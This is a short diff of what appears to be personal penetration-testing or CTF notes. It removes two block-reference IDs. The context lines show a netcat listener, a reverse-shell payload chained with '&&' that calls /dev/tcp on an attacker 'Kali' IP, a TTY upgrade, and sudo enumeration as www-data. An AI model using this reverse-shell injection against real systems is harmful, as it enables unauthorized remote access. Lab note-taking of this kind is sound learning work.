@@ -28,8 +28,6 @@ nc -lvnp 1337
 
 ### Shell syntax
 
-^a674b9
-
 ```
 && bash -i >& /dev/tcp/<KALI MACHINE IP>/1337 0>&1
 ```
@@ -58,7 +56,6 @@ stty raw -echo;fg
 
 ## sudoers
 
-^459f9a
 
 ```
 www-data@ip-10-200-113-12:/var/www/html$ sudo -l
